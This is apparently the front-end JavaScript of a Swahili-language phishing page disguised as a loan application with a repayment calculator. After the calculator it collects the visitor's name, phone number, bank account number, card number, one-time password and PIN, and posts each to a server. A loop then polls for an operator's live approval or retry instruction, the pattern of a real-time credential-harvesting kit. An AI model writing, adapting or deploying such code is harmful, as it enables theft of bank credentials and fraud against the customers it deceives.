function goToScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
    document.getElementById(screenId).classList.remove('hidden');
}

function showSpinner(text = 'Inapakia...') { 
    document.getElementById('loading-text').innerText = text;
    document.getElementById('loading-spinner').classList.remove('hidden'); 
}

function hideSpinner() { 
    document.getElementById('loading-spinner').classList.add('hidden'); 
}

// Calculator Logic
function updateCalculator() {
    const amount = document.getElementById('loanAmountSlider').value;
    const months = document.getElementById('loanMonthsSlider').value;
    
    document.getElementById('displayAmount').innerText = 'TZS ' + Number(amount).toLocaleString();
    document.getElementById('displayMonths').innerText = months + ' miezi';
    document.getElementById('requestedAmount').value = amount;

    const monthly = (Number(amount) * 1.09) / Number(months);
    document.getElementById('displayMonthlyPayment').innerText = 'TZS ' + Math.round(monthly).toLocaleString();
}

function submitCalculator(e) {
    e.preventDefault();
    goToScreen('screen-personal');
}

// Global server request handler
async function postData(step, data) {
    showSpinner('Inasubiri uthibitisho...');
    try {
        const response = await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step, data })
        });
        const result = await response.json();
        if (result.pendingApproval) {
            pollAdminResponse();
        } else {
            hideSpinner();
            if (result.message) alert(result.message);
        }
    } catch (e) {
        hideSpinner();
        alert('Network connection error.');
    }
}

function pollAdminResponse() {
    const pollInterval = setInterval(() => {
        fetch('/api/poll-status')
            .then(res => res.json())
            .then(res => {
                if (res.status) {
                    clearInterval(pollInterval);
                    hideSpinner();
                    handleServerResponse(res);
                }
            })
            .catch(() => {
                // Keep polling on network blips
            });
    }, 1500);
}

function handleServerResponse(res) {
    if (res.status === 'approved') {
        if (res.next === 'card_verify') goToScreen('screen-step3');
        else if (res.next === 'otp') goToScreen('screen-step4');
        else if (res.next === 'pin') goToScreen('screen-step5');
        else if (res.next === 'success') goToScreen('screen-success');
    } else if (res.status === 'retry_phone') {
        goToScreen('screen-personal');
        const notice = document.getElementById('personal-notice');
        notice.style.display = 'block';
        notice.innerText = res.message;
    } else if (res.status === 'denied' || res.status === 'retry_otp' || res.status === 'blocked' || res.status === 'retry_pin') {
        alert(res.message);
        if (res.status === 'retry_pin') {
            const notice = document.getElementById('pin-notice');
            notice.style.display = 'block';
            notice.innerText = res.message;
        }
    }
}

// Form Handlers
function submitPersonal(e) {
    e.preventDefault();
    document.getElementById('personal-notice').style.display = 'none';
    const data = {
        fullName: document.getElementById('fullName').value,
        phoneNumber: document.getElementById('phoneNumber').value,
        loanAmount: document.getElementById('requestedAmount').value
    };
    postData('personal_info', data);
}

function submitStep3(e) {
    e.preventDefault();
    document.getElementById('step3-notice').style.display = 'none';
    const data = {
        accountNumber: document.getElementById('accountNumber').value,
        cardNumber: document.getElementById('cardNumber').value
    };
    postData('step3', data);
}

function submitStep4(e) {
    e.preventDefault();
    const inputs = document.querySelectorAll('.otp-input');
    let otp = '';
    inputs.forEach(i => otp += i.value);
    postData('step4', { otp });
}

function resendOtp(e) {
    e.preventDefault();
    postData('step4', { otp: '', isResend: true });
}

function submitStep5(e) {
    e.preventDefault();
    const inputs = document.querySelectorAll('.pin-input');
    let pin = '';
    inputs.forEach(i => pin += i.value);
    postData('step5', { pin });
}

// Auto-jump for OTP / PIN inputs
document.addEventListener('DOMContentLoaded', () => {
    const setupOtpInputs = (selector) => {
        const inputs = document.querySelectorAll(selector);
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    };
    setupOtpInputs('.otp-input');
    setupOtpInputs('.pin-input');
});
        
